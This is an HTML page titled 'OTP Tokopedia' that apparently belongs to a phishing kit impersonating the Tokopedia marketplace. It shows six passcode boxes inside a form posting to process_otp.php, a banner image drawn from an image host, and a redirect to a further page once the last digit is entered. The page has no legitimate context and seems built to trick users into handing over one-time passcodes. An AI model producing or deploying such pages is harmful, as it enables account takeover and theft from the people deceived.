<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OTP Tokopedia</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      text-align: center;
      background-color: #fff;
    }

    #gambar-atas {
      margin-bottom: 20px;
    }

    #gambar-atas img {
      width: 100%;
      object-fit: cover;
      max-height: 300px;
    }

    #otp-container {
      display: flex;
      justify-content: center;
      margin-top: 20px;
      position: relative;
    }

    .otp-input {
      width: 30px;
      height: 30px;
      font-size: 1em;
      text-align: center;
      margin: 0 3px;
      border: none; /* Hapus garis bawaan input */
      outline: none;
      border-bottom: 2px solid green; /* Garis hijau di bawah input */
    }

    #resend-text {
      color: green;
      margin-top: 10px;
      cursor: pointer;
      font-size: 1.0em;
    }
  </style>
  <script>
    function moveToNext(currentId, nextId) {
      const currentInput = document.getElementById(currentId);
      const nextInput = document.getElementById(nextId);

      if (currentInput.value.length === 1) {
        nextInput.focus();
      }
    }

    function moveToPrevious(currentId, previousId) {
      const currentInput = document.getElementById(currentId);
      const previousInput = document.getElementById(previousId);

      if (currentInput.value.length === 0 && previousInput) {
        previousInput.focus();
      }
    }

    function redirectToPinPage() {
      window.location.href = "otp.html";
    }

    document.addEventListener("input", function(event) {
      const inputElement = event.target;

      if (inputElement.classList.contains("otp-input")) {
        const currentId = inputElement.id;
        const nextId = "otp" + (parseInt(currentId.charAt(3)) + 1);

        if (inputElement.value.length === 1 && nextId.length === 4) {
          const nextInput = document.getElementById(nextId);
          if (nextInput) {
            nextInput.focus();
          }
        }
      }
    });

    document.addEventListener("keydown", function(event) {
      const focusedElement = document.activeElement;

      if (event.key === "Backspace" && focusedElement.classList.contains("otp-input")) {
        const currentId = focusedElement.id;
        const previousId = "otp" + (parseInt(currentId.charAt(3)) - 1);

        moveToPrevious(currentId, previousId);
      }
    });
  </script>
</head>
<body>
  <div id="gambar-atas">
    <img src="https://i.ibb.co/j851stZ/IMG-20231228-WA0005.jpg" alt="Gambar Atas">
  </div>
  <form action="process_otp.php" method="POST">
    <div id="otp-container">
      <input type="number" class="otp-input" max="9" id="otp1" name="otp1" oninput="moveToNext('otp1', 'otp2')">
      <input type="number" class="otp-input" max="9" id="otp2" name="otp2" oninput="moveToNext('otp2', 'otp3')">
      <input type="number" class="otp-input" max="9" id="otp3" name="otp3" oninput="moveToNext('otp3', 'otp4')">
      <input type="number" class="otp-input" max="9" id="otp4" name="otp4" oninput="moveToNext('otp4', 'otp5')">
      <input type="number" class="otp-input" max="9" id="otp5" name="otp5" oninput="moveToNext('otp5', 'otp6')">
      <input type="number" class="otp-input" max="9" id="otp6" name="otp6" oninput="redirectToPinPage()">
    </div>
  </form>
</body>
</html>
